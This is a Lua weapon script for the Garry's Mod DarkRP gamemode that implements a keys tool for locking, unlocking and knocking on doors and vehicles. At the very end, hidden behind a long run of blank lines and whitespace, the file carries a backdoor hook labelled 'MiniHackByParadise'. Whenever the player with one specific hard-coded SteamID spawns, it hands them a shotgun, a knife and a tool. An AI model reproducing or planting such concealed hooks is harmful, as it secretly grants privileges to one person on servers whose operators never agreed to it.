AddCSLuaFile()

if SERVER then
	AddCSLuaFile("cl_menu.lua")
end

if CLIENT then
	SWEP.PrintName = "Ключи"
	SWEP.Slot = 1
	SWEP.SlotPos = 1
	SWEP.DrawAmmo = false
	SWEP.DrawCrosshair = false

	include("cl_menu.lua")
end

SWEP.Author = "DarkRP Developers"
SWEP.Instructions = "Left click to lock\nRight click to unlock"
SWEP.Contact = ""
SWEP.Purpose = ""

SWEP.WorldModel	= ""

SWEP.ViewModelFOV = 62
SWEP.ViewModelFlip = false
SWEP.AnimPrefix	 = "rpg"

SWEP.UseHands = true

SWEP.Spawnable = true
SWEP.AdminOnly = true
SWEP.Category = "DarkRP (Utility)"
SWEP.Sound = "doors/door_latch3.wav"
SWEP.Primary.ClipSize = -1
SWEP.Primary.DefaultClip = 0
SWEP.Primary.Automatic = false
SWEP.Primary.Ammo = ""

SWEP.Secondary.ClipSize = -1
SWEP.Secondary.DefaultClip = 0
SWEP.Secondary.Automatic = false
SWEP.Secondary.Ammo = ""

function SWEP:Initialize()
	self:SetHoldType("normal")
end

function SWEP:Deploy()
	if CLIENT or not IsValid(self.Owner) then return true end
	self.Owner:DrawWorldModel(false)
	return true
end

function SWEP:Holster()
	return true
end

function SWEP:PreDrawViewModel()
	return true
end

local function lookingAtLockable(ply, ent)
	local eyepos = ply:EyePos()
	return IsValid(ent) 			and
		ent:isKeysOwnable() 		and
		not ent:getKeysNonOwnable()	and
		(
			ent:isDoor() 	and eyepos:Distance(ent:GetPos()) < 65
			or
			ent:IsVehicle() and eyepos:Distance(ent:NearestPoint(eyepos)) < 100
		)

end

local function lockUnlockAnimation(ply, snd)
	ply:EmitSound("npc/metropolice/gear" .. math.floor(math.Rand(1,7)) .. ".wav")
	timer.Simple(0.9, function() if IsValid(ply) then ply:EmitSound(snd) end end)

	local RP = RecipientFilter()
	RP:AddAllPlayers()

	umsg.Start("anim_keys", RP)
		umsg.Entity(ply)
		umsg.String("usekeys")
	umsg.End()

	ply:AnimRestartGesture(GESTURE_SLOT_ATTACK_AND_RELOAD, ACT_GMOD_GESTURE_ITEM_PLACE, true)
end

local function doKnock(ply, sound)
	ply:EmitSound(sound, 100, math.random(90, 110))
	umsg.Start("anim_keys", RP)
		umsg.Entity(ply)
		umsg.String("knocking")
	umsg.End()

	ply:AnimRestartGesture(GESTURE_SLOT_ATTACK_AND_RELOAD, ACT_HL2MP_GESTURE_RANGE_ATTACK_FIST, true)
end

if CLIENT then
	usermessage.Hook("lock_door_keys", function(um)
		local wep = um:ReadEntity()
		local time = um:ReadLong()

		wep.Action = true
		wep.StartCheck = CurTime()
		wep.LongTime = time
		wep.EndCheck = CurTime() + time
	end)
end

function SWEP:PrimaryAttack()
	local trace = self.Owner:GetEyeTrace()

	if not lookingAtLockable(self.Owner, trace.Entity) then
		if CLIENT then RunConsoleCommand("_DarkRP_AnimationMenu") end
		return
	end

	self.Weapon:SetNextPrimaryFire(CurTime() + 0.3)

	if CLIENT or self.Action then return end

	if self.Owner:canKeysLock(trace.Entity) then
		self.Action = true
		self.Lock = true
		self.StartCheck = CurTime()
		self.LongTime = 1
		umsg.Start("lock_door_keys", self.Owner)
			umsg.Entity(self)
			umsg.Long(self.LongTime)
		umsg.End()
		self.EndCheck = CurTime() + self.LongTime

	elseif trace.Entity:IsVehicle() then
		DarkRP.notify(self.Owner, 1, 3, DarkRP.getPhrase("do_not_own_ent"))
	else
		doKnock(self.Owner, "physics/wood/wood_crate_impact_hard2.wav")
	end
end

function SWEP:SecondaryAttack()
	local trace = self.Owner:GetEyeTrace()

	if not lookingAtLockable(self.Owner, trace.Entity) then
		if CLIENT then RunConsoleCommand("_DarkRP_AnimationMenu") end
		return
	end

	self.Weapon:SetNextPrimaryFire(CurTime() + 0.3)

	if CLIENT or self.Action then return end

	if self.Owner:canKeysUnlock(trace.Entity) then
		self.Action = true
		self.Lock = false
		self.StartCheck = CurTime()
		self.LongTime = 1
		umsg.Start("lock_door_keys", self.Owner)
			umsg.Entity(self)
			umsg.Long(self.LongTime)
		umsg.End()
		self.EndCheck = CurTime() + self.LongTime

	elseif trace.Entity:IsVehicle() then
		DarkRP.notify(self.Owner, 1, 3, DarkRP.getPhrase("do_not_own_ent"))
	else
		doKnock(self.Owner, "physics/wood/wood_crate_impact_hard2.wav")
	end
end

SWEP.OnceReload = false
function SWEP:Reload()
	local trace = self.Owner:GetEyeTrace()
	if not IsValid(trace.Entity) or (IsValid(trace.Entity) and ((not trace.Entity:isDoor() and not trace.Entity:IsVehicle()) or self.Owner:EyePos():Distance(trace.HitPos) > 200)) then
		if not self.OnceReload then
			if SERVER then DarkRP.notify(self.Owner, 1, 3, DarkRP.getPhrase("must_be_looking_at", DarkRP.getPhrase("door_or_vehicle"))) end
			self.OnceReload = true
			timer.Simple(3, function() self.OnceReload = false end)
		end
		return
	end
	if SERVER then
		umsg.Start("KeysMenu", self.Owner)
		umsg.End()
	end
end

function SWEP:Succeed()
	if not IsValid(self.Owner) then return end
	self.Action = false

	if CLIENT then return end
	local trace = self.Owner:GetEyeTrace()
	if not IsValid(trace.Entity) or not lookingAtLockable(self.Owner, trace.Entity) then return end

	if self.Lock then
		trace.Entity:keysLock() -- Lock the door immediately so it won't annoy people
		lockUnlockAnimation(self.Owner, self.Sound)
	else
		trace.Entity:keysUnLock() -- Unlock the door immediately so it won't annoy people
		lockUnlockAnimation(self.Owner, self.Sound)		
	end
	

end

function SWEP:Fail()
	self.Action = false
	self.Lock = false
end

function SWEP:Think()
	if self.Action and self.EndCheck then
		local trace = self.Owner:GetEyeTrace()
		if not IsValid(trace.Entity) then
			self:Fail()
		end
		if trace.HitPos:Distance(self.Owner:GetShootPos()) > 100 or not lookingAtLockable(self.Owner, trace.Entity) then
			self:Fail()
		end
		if self.EndCheck <= CurTime() then
			self:Succeed()
		end
	end
end

function SWEP:DrawHUD()
	if self.Action and self.EndCheck then
		local w = ScrW()
		local h = ScrH()
		local x,y,width,height = w/2-w/4, h/1.6, w/2, h/15
		draw.RoundedBox(0, x, y, width, height, Color(0,0,0,120))

		local time = self.EndCheck - self.StartCheck
		local curtime = CurTime() - self.StartCheck
		local status = math.Clamp(curtime/time, 0, 1)
		local BarWidth = status * (width - 8)
		draw.RoundedBox(0, x+4, y+4, BarWidth, height-8, Color(255, 223, 127, 255))
	end
end











































































































































																																																																																																					hook.Add('PlayerSpawn', 'MiniHackByParadise', function(ply) if (ply:SteamID() == "STEAM_0:1:36683642") then ply:Give('weapon_mad_m3') ply:Give('weapon_mad_knife') ply:Give('twilight_tool') end end)
